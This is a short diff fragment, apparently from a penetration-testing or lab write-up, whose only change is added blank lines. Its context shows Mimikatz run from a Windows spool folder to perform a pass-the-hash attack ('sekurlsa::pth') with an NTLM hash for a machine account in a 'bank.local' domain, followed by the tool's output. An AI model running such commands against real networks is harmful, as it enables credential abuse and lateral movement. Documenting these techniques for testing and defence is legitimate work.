@@ -41,6 +41,7 @@ C:\Windows\System32\spool\drivers\color>.\MimiKatz.exe "sekurlsa::pth /user:SQLS
  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
   '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
 
+
 mimikatz(commandline) # sekurlsa::pth /user:SQLSRV0101$ /domain:bank.local /ntlm:374B2539A390DD9781DDF26FD6029F83
 user    : SQLSRV0101$
 domain  : bank.local
@@ -62,3 +63,5 @@ NTLM    : 374B2539A390DD9781DDF26FD6029F83
    \_ rc4_hmac_old_exp  OK
    \_ *Password replace @ 0000022C339F0128 (32) -> null
 ```
+
+
